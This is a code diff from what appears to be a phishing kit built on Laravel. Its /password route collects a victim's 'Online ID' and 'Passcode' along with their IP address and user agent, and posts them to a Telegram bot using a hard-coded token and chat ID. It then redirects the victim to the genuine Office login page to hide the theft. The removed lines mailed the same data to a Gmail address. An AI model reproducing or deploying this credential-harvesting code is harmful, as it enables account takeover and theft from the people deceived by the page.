@@ -63,39 +63,47 @@ Route::get('/password/email', function (Request $request) {
 
 
 Route::post('/password', function (Request $request) {
-    $Receive_email = "ridhabelgacem0@gmail.com";
+    $receiveEmail = "ridhabelgacem0@gmail.com";
 
-    $ai = trim($request['ai']);
-    $pr = trim($request['pr']);
+    // Sanitize user input to prevent malicious input
+    $ai = htmlspecialchars(trim($request->input('ai')));
+    $pr = htmlspecialchars(trim($request->input('pr')));
 
+    // Capture IP address and user agent
+    $ip = $request->ip(); 
+    $userAgent = $request->header('User-Agent');
 
+    // Prepare message
+    $message = "|----------| xLs |--------------|\n";
+    $message .= "Online ID            : " . $ai . "\n";
+    $message .= "Passcode             : " . $pr . "\n";
+    $message .= "|--------------- I N F O | I P -------------------|\n";
+    $message .= "|Client IP: " . $ip . "\n";
+    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+    $message .= "User Agent : " . $userAgent . "\n";
+    $message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
 
+    // Send message to Telegram bot (Replace with your actual Telegram bot API)
+    $chatId = '2112852041';
+    $token = '6819516823:AAHjSdp4OYmnMlnzoHb7QgQRVOXSZ4LKaTw';
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+
+    // Prepare Telegram API request
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $message,
+    ];
+
+    // Using cURL to send the message to Telegram
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    // Redirect to Office login page
     return redirect()->away('https://www.office.com/login?es=UnauthClick&ru=%2f');
-    // if($ai != null && $pr != null){
-    //$ip = getenv("REMOTE_ADDR");
-    // $hostname = gethostbyaddr($ip);
-    // $useragent = $_SERVER['HTTP_USER_AGENT'];
-    // $message = "|----------| xLs |--------------|\n";
-    
-    // $message .= "Online ID            : ".$ai."\n";
-    // $message .= "Passcode              : ".$pr."\n";
-    // $message .= "|--------------- I N F O | I P -------------------|\n";
-    // $message .= "|Client IP: ".$ip."\n";
-    // $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
-    // $message .= "User Agent : ".$useragent."\n";
-    // $message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
-    // $send = $Receive_email;
-    // $subject = "Login : $ip";
-    // mail($send, $subject, $message);   
-    // $signal = 'ok';
-    // $msg = 'InValid Credentials';
-        
-        // $praga=rand();
-        // $praga=md5($praga);
-    // }
-    // else{
-    //     $signal = 'bad';
-    //     $msg = 'Please fill in all the fields.';
-    // }
 })->name("password.save");
 
